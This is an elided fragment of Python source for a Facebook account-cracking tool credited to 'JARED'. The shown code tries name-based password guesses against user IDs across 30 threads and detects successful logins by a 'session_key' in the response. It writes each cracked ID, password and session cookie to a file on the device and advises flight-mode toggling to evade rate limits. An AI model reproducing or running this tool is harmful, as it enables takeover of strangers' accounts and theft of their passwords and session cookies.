...
\r\033[1;33m[" MISSKONASYA"]
  
------------------------------------------------------------------------
\033[1;32m ᴀᴜᴛʜᴏʀ    : JARED
\033[1;32m ᴠᴇʀsɪᴏɴ    : 0.01
\033[1;32m ғᴀᴄᴇʙᴏᴏᴋ  : JARED
\033[1;32m ᴛᴏᴏʟ sᴛᴀᴛᴜs : ғʀᴇᴇ
------------------------------------------------------------------------"""
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\033[1;32m [JARED-OK] '+str(ids)+' | '+pas+'\r\033[1;33m)
				open('/sdcard/-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				#print('\r\r\x1b[1;33m [JARED-LOGE] '+str(ids)+' | '+pas+'\r\033[1;33m')
...
def file2():
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;37m ON FLIGHT MODE EVERY 200 COUNTS\033[1;37m")
			linex()
			for user in fo:
...
def ffb1(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\033[1;33m [JARED-CRACKING-VIP] %s| \033[1;32mALIVE\033[0m | \033[1;31mDEAD \033[1;32m%s\033[0m | \033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
